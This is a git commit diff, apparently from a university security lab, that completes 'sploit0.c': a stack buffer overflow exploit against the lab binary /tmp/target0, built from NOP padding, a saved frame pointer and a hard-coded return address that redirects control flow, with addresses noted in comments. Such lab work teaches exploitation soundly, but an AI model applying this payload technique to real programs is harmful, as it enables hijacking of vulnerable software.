189148634464c3b68af4cc043f82739da76c1cf4
zinnia11 <zinnia.nie@gmail.com>
2023-02-15 02:22:23 -0600

    Finished sploit0

--- sploits/sploit0.c
+++ sploits/sploit0.c
@@ -5,13 +5,21 @@
 
 #define TARGET "/tmp/target0"
 
-// override the return to return 0 instead of 1
+// change return address to jump directly to the else part of the if statement
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  // current return addr 0x0804850e
+  // target return addr 0x0804851b
+  // %ebp is 0xbffffdf8
+
+  char *string = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                  "\x90\x90\x90\x90\x90\xf8\xfd\xff\xbf"
+                  "\x1d\x85\x04\x08";
+
+  args[0] = TARGET; args[1] = string; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
